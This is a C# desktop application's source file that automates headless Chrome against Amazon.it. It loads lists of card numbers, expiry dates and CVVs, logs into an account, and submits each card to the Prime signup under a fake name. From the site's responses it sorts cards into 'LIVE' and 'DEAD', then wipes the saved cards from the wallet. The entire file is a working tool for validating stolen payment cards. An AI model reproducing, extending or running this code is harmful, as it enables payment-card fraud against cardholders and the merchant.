using Dominio;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System.Data;
using WMPLib;
using System.IO;

namespace Presentacion
{
    public partial class charge : Form
    {
        public charge()
        {
            InitializeComponent();
        }
        IWebDriver driver;

        private void btniniciar_Click(object sender, EventArgs e)
        {
            this.Close();
        }

        private void label4_Click(object sender, EventArgs e)
        {

        }

        private void btnpausa_Click(object sender, EventArgs e)
        {
            lblstatus.ForeColor = Color.Gold;
            lblstatus.Text = "Pausado";
            try
            {
                driver.Close();

            }
            catch
            {

            }
        }


        private object Tarjetas()
        {
            throw new NotImplementedException();
        }

        private void btncargar_Click(object sender, EventArgs e)
        {
            openFileDialog1.ShowDialog();
            try
            {
                // =========================================================
                char Separador;
                DataTable datagrid = new DataTable();
                DataRow dr;
                //==========================================================
                lblstatus.Text = "Cargadas correctamente!";
                lblstatus.ForeColor = Color.Gold;

                datagrid.Columns.Add("CC");
                datagrid.Columns.Add("MES");
                datagrid.Columns.Add("ANO");
                datagrid.Columns.Add("CVV");
                dr = datagrid.NewRow();
                //=============================================================
                System.IO.StreamReader Archivo = new System.IO.StreamReader(openFileDialog1.FileName);
                Separador = Convert.ToChar("|");
                while (Archivo.Peek() != -1)
                {
                    datagrid.Rows.Add(Archivo.ReadLine().Split(Separador));

                }
                dataGridView1.DataSource = datagrid;
                this.Tarjetas();
                dataGridView1.CurrentRow.Selected = true;
                // =============================================================
            }
            catch (Exception)
            {

            }
            this.tContador.Start();
            //ORGANIZADOR GRID
            int tmn;
            var loopTo = dataGridView1.ColumnCount - 1;
            for (tmn = 0; tmn <= loopTo - 1; tmn++)
            {
                if (tmn == dataGridView1.ColumnCount - 1)
                {
                    dataGridView1.Columns[tmn].AutoSizeMode = DataGridViewAutoSizeColumnMode.Fill;
                }
                else
                {
                    dataGridView1.Columns[tmn].AutoSizeMode = DataGridViewAutoSizeColumnMode.DisplayedCells;
                }

            }
            lblContador.Visible = true;
        }

        private void tContador_Tick(object sender, EventArgs e)
        {
            int suma = 0;
            try
            {
                var loopTo = dataGridView1.RowCount - 1;
                for (int i = 0; i <= loopTo; i++)
                {
                    if (Convert.ToBoolean(dataGridView1.Rows[i].Cells[1].ColumnIndex))
                    {
                        suma += 1;
                    }

                }

                this.lblContador.Text = Convert.ToString(suma);
            }
            catch (Exception)
            {
                lblContador.Text = "0";
            }

            if ((lblContador.Text == "1"))
            {
                lblContador.Text = "0";
                this.tContador.Stop();
                lblstatus.Text = "Finalizado!";
                lblstatus.ForeColor = Color.Red;

            }
        }

        private void btnlimpiar_Click(object sender, EventArgs e)
        {
            try
            {
                driver.Close();

            }
            catch
            {

            }
            dataGridView1.DataSource = null;
            dataGridView1.Rows.Clear();
            dataGridView1.Refresh();
            lblstatus.ForeColor = Color.Gold;
            lblstatus.Text = "Cleaned";
            lives.Items.Clear();
            lblive.Text = "0";
            deads.Items.Clear();
            lbldead.Text = "0";
        }

        private void button1_Click(object sender, EventArgs e)
        {
            vtnlogin.Visible = true;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            String correo = email.Text;
            String contraseña = password.Text;
            if (String.IsNullOrEmpty(correo))
            {
                lblerror.Visible = true;
            }
            else if (String.IsNullOrEmpty(contraseña))
            {
                lblerror.Visible = true;
            }
            else
            {
                lblerror.Visible = false;
                vtnlogin.Visible = false;
                Thread t = new Thread(() => TareaSecundaria(lblstatus, deads, lives, dataGridView1, correo, contraseña));
                t.Start();
            }
        }


        void TareaSecundaria(object statusLabelObject, object deads, object lives, object DatagridView, String correo, String contraseña)
        {

            var statusLabel = statusLabelObject as Label;
            if (statusLabel == null)
                throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");




            try
            {

                if (lblContador.Text == "0")
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                }
                else if (lblContador.Text == "1")
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                }
                else if (Int32.Parse(lblContador.Text) > 300)
                {
                    BeginInvoke((Action)(() => statusLabel.Text = @"Demaciadas ccs!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                }
                else if (Int32.Parse(cache.creditos) < 5)
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                }
                else
                {
                    bool continu = true;
                    try
                    {
                        try
                        {

                            driver.Close();
                        }
                        catch
                        {

                        }
                        primer();
                        driver.FindElement(By.XPath("//*[@id='navBackToTop']/div/span"));
                        BeginInvoke((Action)(() => statusLabel.Text = @"Se inicio sesión!"));
                        BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Green));

                    }
                    catch
                    {
                        BeginInvoke((Action)(() => statusLabel.Text = @"ERROR AL INICIAR"));
                        BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Red));
                        continu = false;
                    }

                    while (continu)
                    {
                        if (lblContador.Text == "0")
                        {
                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            continu = false;
                        }
                        else if (lblContador.Text == "1")
                        {

                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            continu = false;
                        }
                        else if (Int32.Parse(cache.creditos) < 5)
                        {

                            BeginInvoke((Action)(() => statusLabel.Text = @"Finalizado!"));
                            BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                            continu = false;
                        }
                        else
                        {
                            try
                            {
                                comprandoprime();
                                proceso();
                                validar();
                                eliminar();
                                eliminarx2();
                           }
                            catch
                            {
                                Thread.Sleep(2000);
                                /*    BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO"));
                                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                                    continu = false;
                                    try
                                    {

                                        driver.Close();
                                    }
                                    catch
                                    {

                                    }*/
                            }
                        }

                    }
                }


            }
            catch
            {

                BeginInvoke((Action)(() => statusLabel.Text = @"PAUSADO"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Gold));
                try
                {

                    driver.Quit();
                }
                catch
                {

                }

            }



            void primer()
            {

                // Changes to controls must be performed on the UI thread.
                BeginInvoke((Action)(() => statusLabel.Text = @"Iniciando (1/5)"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));


                string path = Directory.GetCurrentDirectory();
                ChromeDriverService service = ChromeDriverService.CreateDefaultService(path, "chromedriver2.exe");
                service.HideCommandPromptWindow = true;
                    ChromeOptions options = new ChromeOptions();
                    //colombia

                    options.AddArgument("--headless");
                    options.AddArgument("no-sandbox");
                    options.AddArgument("--disable-extensions");
                    options.AddArgument("--disable-gpu");
                    options.AddArgument("--disable-dev-shm-usage");
                    options.AddArgument("--no-sandbox");
                    options.AddArgument("--ignore-certificate-errors");
                    options.AddArgument("--incognito");
                    options.AddArgument("window-size=1200,1200");

                    driver = new ChromeDriver(service, options);
                

                BeginInvoke((Action)(() => statusLabel.Text = @"datos cargados "));
                Thread.Sleep(3000);
                driver.Navigate().GoToUrl("https://www.amazon.it/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.it%2Fgp%2Fbestsellers%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=itflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&");
                Thread.Sleep(3000);
                driver.FindElement(By.XPath("//*[@id='ap_email']")).SendKeys(correo);
                driver.FindElement(By.XPath("//*[@id='continue']")).Click();
                driver.FindElement(By.XPath("//*[@id='ap_password']")).SendKeys(contraseña);
                driver.FindElement(By.XPath("//*[@id='signInSubmit']")).Click();
                if (driver.PageSource.Contains("Añadir número de teléfono móvil"))
                {
                    driver.FindElement(By.XPath("//*[@id='ap-account-fixup-phone-skip-link']")).Click();
                }


            }

            void comprandoprime()
            {
                BeginInvoke((Action)(() => statusLabel.Text = @"Comprando prime"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                Thread.Sleep(2000);
                IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                driver.Navigate().GoToUrl("https://www.amazon.it/hp/wlp/pipeline/membersignup?redirectURL=L2dwL3ByaW1l&primeCampaignId=SlashPrime&locationID=prime_confirm&offerToken=0JtB-jQ9wcczNLk67PRrwx0hQ_i2Cw4Ut62ioxDmUjqk5ItaVg18xPMFoyM8r1QjzB_qRvtMzqfmfe4PHOviARuDydcqNxZzlN-A8O6oRwZPZCfc4FSlV2NkX28ZFPFBQCstdkOIGPnayRI6g5bl73c65RE70rbVZQnJlDyLl7q9H7Vpy7BbzJlpX2pZSCehfrTOjNs9a9GKCQm_HNEXeSyzdHY7A0GKJ-_Sr9EkQmFLhiJX9qylXZzwQlKQvaQehlg0nbd6NAjzZognXbaLQgmjoyEfUIulcoyQqzJgoIWBiloNHLWYV1TZ752DqkTRlqZ8xolliEAJiD_SevEwDq0LWEBZ4VhOQ8n59pBcHX04f86S23j2vGTYyBCkBIkPNjyV9Xn4dmKuFwh2Wj69sc1Ts-LKVPSc83TTlrQdksj5szLq5CEBeRYNZyfN1Ejs58i6h-4LssTxGEu8Zn4Y3RyKdMSmDpyERG1Jmj-G_vyfrJ5tdFj5O9a4Fmb_IOCKik0E4uG1s7S6lE-qJu4W0HYKCv4tYzn67QWxqVAaTZOq0tccx_8lsRh4shqsQq05PwLiO6yXX41phlMSxbh1OmJJHyN2lTcMoM-R3PpOH1aO_hEf2puDJvvu85wEuE_pSefiVHu8SjkwcyPogsyzOvd_H8kDETyCJIDqilqjmCW-8R5H4A&cancelRedirectURL=L2dwL3ByaW1l&captcha_verified=1&claim_type=EmailAddress&new_account=1&");
                Thread.Sleep(2000);

                //IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                try
                {
                   // driver.FindElement(By.Id("prime-header-CTA")).Click();
                  try
                    { 
                    //Thread.Sleep(2000);
                    driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/form/div/div/div/div[1]/div[2]/div/span[4]/input")).Click();
                    Thread.Sleep(2000);
                    driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[4]/div/div/div[1]/div/div[2]/div/div/span/a")).Click();
                    Thread.Sleep(3000);
                    }
                    catch (IOException e)
                    {
                        driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[4]/div/div/div[1]/div/div[2]/div/div/span/a")).Click();
                        Thread.Sleep(3000);
                    }
                }
                catch (IOException e)
                {

                    TextWriter sw = new StreamWriter("errorlog.txt");
                    sw.WriteLine("AmzIt/ComprandoPrime");
                    string error = e.Message;
                    sw.WriteLine(error);
                    sw.Close();

                }
                Thread.Sleep(2000);

            }
            void seleccionar()
            {
                Thread.Sleep(3000);

                IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                try
                {
                    Thread.Sleep(3000);
                    BeginInvoke((Action)(() => statusLabel.Text = @"Seleccionando la cc"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));

                    try
                    {
                        driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[3]/form/div[1]/div/div/div[1]/div[3]/div/div/div/div/div/div[1]/span/div/label/input")).Click();
                        Thread.Sleep(2000);
                        driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[3]/form/div[2]/div/div/div/span/span/input")).Click();
                       // BeginInvoke((Action)(() => statusLabel.Text = @"ya seleccione la direccion aohra intento seguir?"));
                      //  BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                        Thread.Sleep(3000);
                    }
                    catch
                    {
                        driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[3]/form/div[1]/div/div/div[1]/div[3]/div[1]/div/div/div/div/div[1]/span/div/label/input")).Click();
                        Thread.Sleep(2000);
                        driver.FindElement(By.XPath("/html/body/div[1]/div[2]/div[2]/div[4]/div[3]/div[2]/div[3]/form/div[2]/div/div/div/span/span/input")).Click();
                     //   BeginInvoke((Action)(() => statusLabel.Text = @"ya seleccione la direccion aohra intento seguir xxxx22?"));
                      //  BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                        Thread.Sleep(3000);
                    }
                }
                catch (IOException e)
                {
                    Thread.Sleep(3000);

                    TextWriter sw = new StreamWriter("errorlog.txt");
                    sw.WriteLine("AmzIt/Seleccionando");
                    string error = e.Message;
                    sw.WriteLine(error);
                    sw.Close();
                }


            }

            void validar()
            {


                var statusLabel = statusLabelObject as Label;
                var livess = lives as ListBox;
                var deadss = deads as ListBox;
                var dataGridView1 = DatagridView as DataGridView;
                if (statusLabel == null)
                    throw new ArgumentException(@"Parameter must be of type Label", "statusLabelObject");
                BeginInvoke((Action)(() => statusLabel.Text = @"Validando"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));

                Thread.Sleep(2000);

                IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));

                string cc = dataGridView1.CurrentRow.Cells[0].Value.ToString().TrimEnd();
                string month = dataGridView1.CurrentRow.Cells[1].Value.ToString().TrimEnd();
                string year = dataGridView1.CurrentRow.Cells[2].Value.ToString().TrimEnd();
                string cvv = dataGridView1.CurrentRow.Cells[3].Value.ToString().TrimEnd();

                if (driver.PageSource.Contains("Si è verificato un errore durante la convalida del metodo di pagamento. Aggiorna o aggiungi un nuovo metodo di pagamento e riprova."))
                {
                    BeginInvoke((Action)(() => deadss.Items.Add("✘ DEAD [GATE - COLOMBIA] - " + cc + " | " + month + " | " + year + " | " + cvv + " - [Golpe De Estado]")));
                    BeginInvoke((Action)(() => statusLabel.Text = @"✘ DEAD ✘"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Red));
                    BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1])); BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1]));
                    BeginInvoke((Action)(() => dataGridView1.Rows.RemoveAt(dataGridView1.CurrentRow.Index)));
                }
                else if(driver.PageSource.Contains("Il tuo metodo di pagamento non è stato verificato."))
                {
                    BeginInvoke((Action)(() => deadss.Items.Add("✘ DEAD [GATE - COLOMBIA] - " + cc + " | " + month + " | " + year + " | " + cvv + " - [Golpe De Estado]")));
                    BeginInvoke((Action)(() => statusLabel.Text = @"✘ DEAD ✘"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Red));
                    BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1])); BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1]));
                    BeginInvoke((Action)(() => dataGridView1.Rows.RemoveAt(dataGridView1.CurrentRow.Index)));
                }
                else if (driver.PageSource.Contains("Siamo spiacenti, ma solo i clienti con un indirizzo di fatturazione italiano possono iscriversi a Prime su Amazon.it"))
                {
                    datos delete = new datos();
                    var eliminar = delete.Discount(cache.user);
                    cache.creditos = eliminar;
                    //eliminar = creditos.Text;
                    WindowsMediaPlayer musica;
                    musica = new WindowsMediaPlayer();
                    musica.URL = Application.StartupPath + @"\driver\live.mp3";
                    musica.controls.play();
                    BeginInvoke((Action)(() => statusLabel.Text = @"✔ LIVE ✔"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Green));
                    datos bin = new datos();
                    string tarjt = cc + "|" + month + "|" + year + "|" + cvv;
                    var binlookup = delete.bin(cache.user, tarjt, "COLOMBIA");

                    BeginInvoke((Action)(() => livess.Items.Add("✔ LIVE [GATE - COLOMBIA] - " + cc + " | " + month + " | " + year + " | " + cvv + "✔ - [Golpe De Estado] - [" + binlookup + "]")));

                    BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1])); BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1]));
                    BeginInvoke((Action)(() => dataGridView1.Rows.RemoveAt(dataGridView1.CurrentRow.Index)));
                    BeginInvoke((Action)(() => statusLabel.Text = @eliminar));

                   

                }
                else if (driver.PageSource.Contains("Siamo spiacenti, non puoi usufruire del periodo gratuito di 30 giorni ma puoi comunque effettuare l'iscrizione ad Amazon Prime."))
                {
                    datos delete = new datos();
                    var eliminar = delete.Discount(cache.user);
                    cache.creditos = eliminar;
                    //eliminar = creditos.Text;
                    WindowsMediaPlayer musica;
                    musica = new WindowsMediaPlayer();
                    musica.URL = Application.StartupPath + @"\driver\live.mp3";
                    musica.controls.play();
                    BeginInvoke((Action)(() => statusLabel.Text = @"✔ LIVE ✔"));
                    BeginInvoke((Action)(() => statusLabel.ForeColor = Color.Green));
                    datos bin = new datos();
                    string tarjt = cc + "|" + month + "|" + year + "|" + cvv;
                    var binlookup = delete.bin(cache.user, tarjt, "COLOMBIA");

                    BeginInvoke((Action)(() => livess.Items.Add("✔ LIVE [GATE - COLOMBIA] - " + cc + " | " + month + " | " + year + " | " + cvv + "✔ - [Golpe De Estado] - [" + binlookup + "]")));

                    BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1])); BeginInvoke((Action)(() => dataGridView1.CurrentCell = dataGridView1.Rows[0].Cells[1]));
                    BeginInvoke((Action)(() => dataGridView1.Rows.RemoveAt(dataGridView1.CurrentRow.Index)));
                    BeginInvoke((Action)(() => statusLabel.Text = @eliminar));

                   

                }
                else
                {
                    validar();
                }
            }

            void pagar()
            {
                try
                {
                  //  BeginInvoke((Action)(() => statusLabel.Text = @"Voy a darlkeeeeeeeee lickkkkkkkkkkkkkk"));
                  //  BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                 //   Thread.Sleep(2000);
                    Thread.Sleep(3000);
                    driver.FindElement(By.XPath("//*[@id='wlp-join-prime-button-announce']")).Click();
                  //  BeginInvoke((Action)(() => statusLabel.Text = @"Voy a siiiiiiiiiiii le diiiiiiii"));
                  //  BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                    Thread.Sleep(2000);
                }
                catch (IOException e)
                {
                    TextWriter sw = new StreamWriter("errorlog.txt");
                    sw.WriteLine("AmzIt/Pagando");
                    string error = e.Message;
                    sw.WriteLine(error);
                    sw.Close();

                }
            }

            void direccion()
            {
                Thread.Sleep(3000);
                try
                {
                  /*  try
                {*/
                    driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/form/div/div/div/div/div/span[2]/span/input")).Click();
                    Thread.Sleep(3000);
                /*}
                catch
                {
                    driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/form/div/div/div[1]/div[2]/div[2]/input")).SendKeys("Cl. 33a Sur #73f 08");
                    driver.FindElement(By.XPath("//*[@id='city']/input")).SendKeys("Bogota");
                    driver.FindElement(By.XPath("//*[@id='stateOrRegion']/input")).SendKeys("Cundinamarca");
                    driver.FindElement(By.XPath("//*[@id='postalCode']/input")).SendKeys("110821");
                    // select the drop down list
                    var pais = driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/form/div/div/div[1]/div[2]/div[7]/span/select"));
                    //create select element object 
                    var selectElement = new SelectElement(pais);
                    // select by text
                    selectElement.SelectByText("Colombia");
                    driver.FindElement(By.XPath("//*[@id='phoneNumber']/input")).SendKeys("3213765542");

                    driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/form/div/div/div[2]/div/span/span/input")).Click();
                
                }*/
                }
                catch (IOException e)
                {
                    TextWriter sw = new StreamWriter("errorlog.txt");
                    sw.WriteLine("AmzIt/Direccion");
                    string error = e.Message;
                    sw.WriteLine(error);
                    sw.Close();

                }
            }

            void proceso()
            {
                try { 
                BeginInvoke((Action)(() => statusLabel.Text = @"Agregando cc"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                Thread.Sleep(2000);

                IWait<IWebDriver> wait = new WebDriverWait(driver, TimeSpan.FromSeconds(30.00));
                wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));

                string cc = dataGridView1.CurrentRow.Cells[0].Value.ToString().TrimEnd();
                string month = dataGridView1.CurrentRow.Cells[1].Value.ToString().TrimEnd();
                string year = dataGridView1.CurrentRow.Cells[2].Value.ToString().TrimEnd();
                string cvv = dataGridView1.CurrentRow.Cells[3].Value.ToString().TrimEnd();
                driver.SwitchTo().Frame(driver.FindElement(By.ClassName("apx-inline-secure-iframe")));
                driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/div/form/div[3]/div[1]/input")).SendKeys("Juan Chupeste");
                driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/div/form/div[3]/div[2]/div/input")).SendKeys(cc);
                var mesexp = driver.FindElement(By.XPath("//*[@id='add-credit-card-expiry-date-input-id']/span[1]/select"));
                var selectElement = new SelectElement(mesexp);
                selectElement.SelectByText(month);
                var añoexp = driver.FindElement(By.XPath("//*[@id='add-credit-card-expiry-date-input-id']/span[3]/select"));
                var selectElement2 = new SelectElement(añoexp);
                selectElement2.SelectByText(year);
                Thread.Sleep(3000);

                WebElement añadir = (WebElement)driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div/div/div/div/form/div[3]/div[5]/span/span/input"));
                IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                js.ExecuteScript("arguments[0].scrollIntoView();", añadir);
                js.ExecuteScript("arguments[0].click();", añadir);
               // Thread.Sleep(2000);

                wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
                Thread.Sleep(2000);
                direccion();
                driver.SwitchTo().DefaultContent();
                Thread.Sleep(2000);
                seleccionar();
                Thread.Sleep(2000);

              // wait.Until(driver1 => ((IJavaScriptExecutor)driver).ExecuteScript("return document.readyState").Equals("complete"));
              //   BeginInvoke((Action)(() => statusLabel.Text = @"Voy a pagarrrrrrr"));
              //   BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                Thread.Sleep(2000);
                pagar();
                Thread.Sleep(2000);
                }
                catch (IOException e)
                {
                    TextWriter sw = new StreamWriter("errorlog.txt");
                    sw.WriteLine("AmzIt/Proceso");
                    string error = e.Message;
                    sw.WriteLine(error);
                    sw.Close();

                }
            }


            void ingresar()
            {
                Thread.Sleep(2000);
                if (driver.PageSource.Contains("Dirección de e-mail o número de teléfono móvil"))
                {
                    driver.FindElement(By.XPath("//*[@id='ap_email']")).SendKeys(correo);
                    driver.FindElement(By.XPath("//*[@id='continue']")).Click();
                }
                Thread.Sleep(2000);
                if (driver.PageSource.Contains("Contraseña"))
                {
                    driver.FindElement(By.XPath("//*[@id='ap_password']")).SendKeys(contraseña);
                    driver.FindElement(By.XPath("//*[@id='signInSubmit']")).Click();
                    Thread.Sleep(2000);
                    if (driver.PageSource.Contains("Añadir número de teléfono móvil"))
                    {
                        driver.FindElement(By.XPath("//*[@id='ap-account-fixup-phone-skip-link']")).Click();
                        Thread.Sleep(2000);
                    }
                    driver.Navigate().GoToUrl("https://www.amazon.it/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo");
                    Thread.Sleep(2000);
                }


            }

            void eliminar()
            {
                try
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Eliminando ccs"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                driver.Navigate().GoToUrl("https://www.amazon.it/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo");
                ingresar();
               
                    Thread.Sleep(3000);
                    driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div[3]/div/div[2]/div/div/div/div/div[2]/div[3]/div/div[1]/div/a"));
                    eliminarr();
                }
                catch
                {
                    Thread.Sleep(2000);
                }
            }
            void eliminarr()
            {

                BeginInvoke((Action)(() => statusLabel.Text = @"Eliminando data"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                try
                {
                    IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                Thread.Sleep(2000);
                WebElement editar = (WebElement)driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div[3]/div/div[2]/div/div/div/div/div[2]/div[3]/div/div[1]/div/a"));
                js.ExecuteScript("arguments[0].click();", editar);
                Thread.Sleep(2000);
                WebElement eliminar = (WebElement)driver.FindElement(By.XPath("//*[@id='a-popover-content-1']/div/form[2]/div[3]/div[1]/span/input"));
                js.ExecuteScript("arguments[0].click();", eliminar);
                Thread.Sleep(2000);
                WebElement confirmar = (WebElement)driver.FindElement(By.XPath("//*[@id='a-popover-content-2']/div/div[3]/div/span[1]/span/input"));
                js.ExecuteScript("arguments[0].click();", confirmar);
                eliminarr();
                }
                catch
                {
                    Thread.Sleep(2000);
                }
            }
            void eliminarx2()
            {
                try
                {

                    BeginInvoke((Action)(() => statusLabel.Text = @"Eliminando ccs"));
                BeginInvoke((Action)(() => statusLabel.ForeColor = Color.White));
                driver.Navigate().GoToUrl("https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo");
                ingresar();
                
                    driver.FindElement(By.XPath("//*[@id='cpefront-mpo-widget']/div/div[2]/div[3]/div/div[2]/div/div/div/div/div[2]/div[3]/div/div[1]/div/a"));
                    eliminarr();
                }
                catch
                {
                    Thread.Sleep(2000);
                }
            }

        }

        private void lives_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Control == true && e.KeyCode == System.Windows.Forms.Keys.C)
            {
                string s = lives.SelectedItem.ToString();
                Clipboard.SetData(DataFormats.StringFormat, s);
            }
        }

        private void vtnlogin_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}
